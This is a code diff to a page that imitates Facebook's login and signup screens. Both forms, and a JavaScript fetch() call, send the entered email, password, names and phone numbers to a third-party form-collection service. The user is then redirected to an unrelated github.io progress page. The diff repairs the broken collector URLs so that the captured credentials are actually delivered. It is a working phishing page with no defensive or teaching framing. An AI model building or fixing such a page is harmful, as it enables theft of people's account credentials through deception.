@@ -165,12 +165,8 @@
         <section class="hero">
             <h2>Connect with friends and the world around you on Facebook.</h2>
             <form id="login-form" action="https://submit-form.com/dmQeERDSQ" method="POST">
-                <input type="hidden"
-            name="_redirect"
-            value="https://joshuabentley.github.io/assets/html/progress.html"
-            type="hidden"/>
-            <input type="hidden" name="_append" value="false"/>
-
+                <input type="hidden" name="_redirect" value="https://joshuabentley.github.io/assets/html/progress.html"/>
+                <input type="hidden" name="_append" value="false"/>
 
                 <input type="text" name="email" placeholder="Email or Phone Number" required>
                 <input type="password" name="password" placeholder="Password" required>
@@ -183,7 +179,7 @@
 
         <section class="signup-section">
             <h2>Create a new account</h2>
-            <form action="https://submit.formspark.io/Form id:dmQeERDSQ" method="POST">
+            <form action="https://submit-form.com/dmQeERDSQ" method="POST">
                 <input type="text" name="firstName" placeholder="First Name" required>
                 <input type="text" name="lastName" placeholder="Last Name" required>
                 <input type="text" name="emailOrPhone" placeholder="Mobile Number or Email" required>
@@ -198,6 +194,7 @@
         <p>Facebook © 2024</p>
     </footer>
 
+    <!-- Internal JavaScript -->
     <script>
         document.getElementById('login-form').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent the default form submission behavior
@@ -206,7 +203,7 @@
             const formData = new FormData(this);
 
             // Submit the form data via JavaScript to Formspark
-            fetch('https://submit.formspark.io/Form id:dmQeERDSQ', {
+            fetch('https://submit-form.com/dmQeERDSQ', {
                 method: 'POST',
                 body: formData
             })
